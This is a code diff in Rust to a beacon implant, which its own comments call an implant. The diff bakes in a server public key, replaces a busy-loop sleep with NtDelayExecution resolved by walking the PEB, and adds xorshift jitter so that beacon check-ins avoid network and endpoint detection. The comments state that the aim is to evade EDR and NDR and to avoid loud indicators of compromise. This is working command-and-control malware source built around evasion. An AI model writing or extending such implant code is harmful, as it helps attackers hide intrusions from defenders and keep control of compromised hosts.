@@ -118,28 +118,71 @@ fn execute(cmd: Command) -> Vec<Response> {
     }
 }
 
-/// Load build-time config. M0: placeholder defaults; the per-build encrypted
-/// config (nyx-config crate) lands in a later phase.
+/// Load build-time config. Per-build encrypted config (nyx-config crate) lands
+/// in a later phase; for now host/port/uri are compile-time defaults and the
+/// server long-term pubkey is baked by build.rs (H7) — no longer the all-zero
+/// identity point that previously made session keys predictable.
 fn load_config() -> Config {
     Config {
         server_host: String::from("127.0.0.1"),
         server_port: 8443,
         beacon_uri: String::from("/beacon"),
-        server_pub: [0u8; 32], // TODO: bake real server_pub at build time
+        server_pub: crate::server_pub::SERVER_PUB,
         sleep_seconds: 5,
         jitter_pct: 20,
         use_tls: false,
     }
 }
 
-/// Sleep N seconds. M0: busy-loop placeholder; A6 replaces with a syscall-based
-/// sleep (NtDelayExecution) via indirect syscalls.
-fn sleep_seconds(_s: u32) {
-    // TODO: NtDelayExecution via resolved ntdll (indirect syscall).
-    core::hint::spin_loop();
+/// Sleep N seconds via NtDelayExecution.
+///
+/// Resolves `ntdll!NtDelayExecution` through the PEB-walk export resolver and
+/// calls it with a relative (negative) interval in 100-ns units. The previous
+/// implementation was a single `spin_loop()` hint that returned immediately,
+/// making the beacon hot-loop at 100% CPU on every check-in retry — an
+/// extremely loud IOC. This blocks the calling thread the way a real implant
+/// should.
+///
+/// Falls back to a bounded spin only if the export can't be resolved (defensive
+/// — on a real Windows host ntdll is always present).
+fn sleep_seconds(seconds: u32) {
+    type NtDelayExecution = unsafe extern "system" fn(u8, *const i64) -> i32;
+    let delay_100ns: i64 = -(seconds as i64).saturating_mul(10_000_000); // relative, 100ns units
+    // export_addr walks live module memory via raw pointers — unsafe.
+    if let Some(addr) = unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution") } {
+        let f: NtDelayExecution = unsafe { core::mem::transmute(addr) };
+        // Alertable = FALSE; interval is relative (negative).
+        unsafe { f(0, &delay_100ns as *const i64) };
+        return;
+    }
+    // Should not happen on a real host, but never infinite-spin: bound the
+    // fallback so we can't peg a core if resolution somehow failed.
+    let spins = seconds.min(60) as u64 * 10_000_000;
+    for _ in 0..spins {
+        core::hint::spin_loop();
+    }
 }
 
+/// Sleep `base` seconds, varied by ±jitter_pct% so beacon timing isn't a
+/// metronome (a fixed-period beacon is a trivial NDR/EDR signature).
 fn sleep_jitter(base: u32, jitter_pct: u8) {
-    sleep_seconds(base);
-    let _ = jitter_pct;
+    if jitter_pct == 0 || base == 0 {
+        sleep_seconds(base);
+        return;
+    }
+    // Cheap LCG over a static seed — no need for a CSPRNG here (this only
+    //shapes sleep length, not anything secret). xorshift32.
+    static SEED: core::sync::atomic::AtomicU32 = core::sync::atomic::AtomicU32::new(0x9E37_79B9);
+    let mut x = SEED.load(core::sync::atomic::Ordering::Relaxed);
+    if x == 0 {
+        x = 0x9E37_79B9;
+    }
+    x ^= x << 13;
+    x ^= x >> 17;
+    x ^= x << 5;
+    SEED.store(x, core::sync::atomic::Ordering::Relaxed);
+    let span = (base as u32).saturating_mul(jitter_pct as u32) / 100;
+    let off = if span > 0 { x % (2 * span) } else { 0 };
+    let actual = base.saturating_add(off).saturating_sub(span);
+    sleep_seconds(actual.max(1));
 }
